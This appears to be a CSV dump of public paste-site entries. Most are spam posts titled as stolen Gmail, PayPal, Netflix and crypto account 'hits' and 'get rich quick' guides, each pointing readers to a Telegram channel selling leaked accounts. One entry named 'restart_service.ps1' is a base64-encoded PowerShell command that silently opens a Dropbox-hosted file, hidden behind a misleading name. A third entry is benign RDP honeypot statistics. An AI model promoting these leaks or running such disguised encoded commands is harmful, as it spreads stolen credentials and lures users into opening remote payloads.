id,title,username,language,date,content
q61b21ha,GMAIL Logs (2FA disabled),cokyyy,JavaScript,Thursday 26th of June 2025 07:23:04 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 41579"
2haH6sNq,FREE BTC GUIDE,cokyyy,JavaScript,Thursday 26th of June 2025 07:22:33 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 66844"
gC1duyWK,MAKE $500 INSTANTLY,cokyyy,JavaScript,Thursday 26th of June 2025 07:22:01 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 45739"
GJfALVgh,Netflix Premium UHD Hits,cokyyy,JavaScript,Thursday 26th of June 2025 07:21:29 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 59163"
yLZYfBNM,✅ MAKE $1200 IN 15 MIN,cokyyy,JavaScript,Thursday 26th of June 2025 07:20:58 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 59009"
2NcQzBB6,Make $1200 in 15 minutes,cokyyy,JavaScript,Thursday 26th of June 2025 07:20:27 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 51362"
8a4f2m2m,✅ Crypto Accounts,cokyyy,JavaScript,Thursday 26th of June 2025 07:19:54 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 65577"
E2PgK8vE,✅ PayPal Hits,cokyyy,JavaScript,Thursday 26th of June 2025 07:19:23 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 46173"
1phfQbfF,restart_service.ps1,Comeors,Batch,Thursday 26th of June 2025 07:18:51 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADkAYgBjAGQAZgBjADEAOQA=

aYyFCO"
j3RWgppU,✅ Account Leaks,Double_Y,JavaScript,Thursday 26th of June 2025 07:18:45 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 32441"
VVvJR1ED,GMAIL Logs (2FA disabled),Double_Y,JavaScript,Thursday 26th of June 2025 07:18:14 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 00786"
6ywTev8W,2025-06-26_stats.json,rdp_snitch,JSON,Thursday 26th of June 2025 07:18:01 PM CDT,"{
  ""ip"": {
    ""14.225.202.191"": 11775,
    ""24.173.30.170"": 21468,
    ""2.57.121.247"": 15,
    ""147.185.132.132"": 9,
    ""23.148.144.149"": 3,
    ""193.142.146.227"": 15,
    ""92.63.197.23"": 33,
    ""203.176.135.5"": 6,
    ""205.210.31.213"": 9,
    ""102.88.21.215"": 3,
    ""162.142.125.209"": 3,
    ""45.227.254.132"": 9,
    ""91.238.181.91"": 6,
    ""138.68.188.52"": 3,
    ""111.170.152.113"": 9,
    ""185.196.220.41"": 9,
    ""45.227.253.52"": 12,
    ""188.166.234.227"": 6,
    ""88.214.25.124"": 6,
    ""205.210.31.134"": 9,
    ""193.24.211.25"": 6,
    ""146.190.167.180"": 9,
    ""45.227.253.51"": 3,
    ""159.89.192.184"": 9,
    ""139.59.117.151"": 6,
    ""162.210.245.77"": 12,
    ""152.32.235.90"": 3,
    ""170.64.130.115"": 18,
    ""198.235.24.51"": 9
  },
  ""asn"": {
    ""AS135905"": 11775,
    ""AS11427"": 21468,
    ""AS47890"": 15,
    ""AS396982"": 36,
    ""AS46664"": 3,
    ""AS213438"": 24,
    ""AS210848"": 33,
    ""AS38235"": 6,
    ""AS29465"": 3,
    ""AS398324"": 3,
    ""AS267784"": 9,
    ""AS49434"": 6,
    ""AS14061"": 51,
    ""AS151185"": 9,
    ""AS209272"": 15,
    ""AS35042"": 6,
    ""AS215929"": 6,
    ""AS397651"": 12,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Vietnam Posts and Telecommunications Group"": 11775,
    ""Charter Communications Inc"": 21468,
    ""Unmanaged LTD"": 15,
    ""Google LLC"": 36,
    ""VolumeDrive"": 3,
    ""ColocaTel Inc."": 24,
    ""Telkom Internet LTD"": 33,
    ""Angkor Data Communication"": 6,
    ""MTN NIGERIA Communication limited"": 3,
    ""Censys, Inc."": 3,
    ""Flyservers S.A."": 9,
    ""Datacenter location PAR1 France"": 6,
    ""DigitalOcean, LLC"": 45,
    ""China Telecom"": 9,
    ""Flyservers S.A"": 15,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Data Campus Limited"": 6,
    ""DIGITALOCEAN"": 6,
    ""RCI Broadband"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""VNPT"": 11775,
    ""Spectrum"": 21468,
    ""Unmanaged LTD"": 15,
    ""Palo Alto Networks, Inc"": 36,
    ""Quick Server Hosting LLC"": 3,
    ""ColocaTel Inc"": 15,
    ""Korotkij Denis Aleksandrovich"": 33,
    ""Mekongnet"": 6,
    ""MTN Nigeria"": 3,
    ""Censys Inc"": 3,
    ""Xwin Universal LTD"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""DigitalOcean, LLC"": 45,
    ""Chinanet HB"": 9,
    ""Colocatel Inc"": 9,
    ""Nextcloud S.A"": 15,
    ""Digitalocean"": 6,
    ""Data Campus Limited"": 6,
    ""10x Servers"": 12,
    ""Ucloud Information Technology"": 3
  },
  ""regionName"": {
    ""Hanoi"": 11775,
    ""Texas"": 21468,
    ""England"": 18,
    ""California"": 48,
    ""Pennsylvania"": 3,
    ""North Holland"": 48,
    ""Phnom Penh"": 6,
    ""Lagos"": 3,
    ""Michigan"": 3,
    ""Vilnius"": 9,
    ""\u00cele-de-France"": 6,
    ""Hubei"": 9,
    ""Virginia"": 21,
    ""La Paz Department"": 15,
    ""South West"": 21,
    ""Kowloon City"": 6,
    ""Central and Western District"": 6,
    ""New South Wales"": 18
  },
  ""country"": {
    ""Vietnam"": 11775,
    ""United States"": 21543,
    ""United Kingdom"": 18,
    ""The Netherlands"": 48,
    ""Cambodia"": 6,
    ""Nigeria"": 3,
    ""Lithuania"": 9,
    ""France"": 6,
    ""China"": 9,
    ""Bolivia"": 15,
    ""Singapore"": 21,
    ""Hong Kong"": 12,
    ""Australia"": 18
  },
  ""account"": {
    ""hello"": 33315,
    ""Administr"": 57,
    ""sziFFXkRz"": 3,
    ""tgIIEH"": 3,
    ""tXxsZC"": 3,
    ""Domain"": 33,
    ""LdWhMWjSq"": 3,
    ""Plwpzr"": 3,
    ""kjCQBo"": 3,
    ""(empty)"": 3,
    ""Test"": 36,
    ""yOtFIKxDa"": 3,
    ""uNCYnW"": 3,
    ""tUjObS"": 3,
    ""Administrator"": 3,
    ""UglEWDRwa"": 3,
    ""YGfbog"": 3,
    ""GYDDEn"": 3
  },
  ""keyboard"": {
    ""Unknown"": 33483
  },
  ""client_build"": {
    ""Unknown"": 33483
  },
  ""client_name"": {
    ""Unknown"": 33483
  },
  ""ip_type"": {
    ""Unknown"": 33369,
    ""hosting"": 99,
    ""mobile & hosting"": 3,
    ""proxy"": 12
  }
}"
z5L4uZD6,FREE BTC GUIDE,Double_Y,JavaScript,Thursday 26th of June 2025 07:17:42 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 69461"
yqywHBx4,MAKE $500 INSTANTLY,Double_Y,JavaScript,Thursday 26th of June 2025 07:17:11 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 26231"
5sf3EHYb,Netflix Premium UHD Hits,Double_Y,JavaScript,Thursday 26th of June 2025 07:16:39 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 20767"
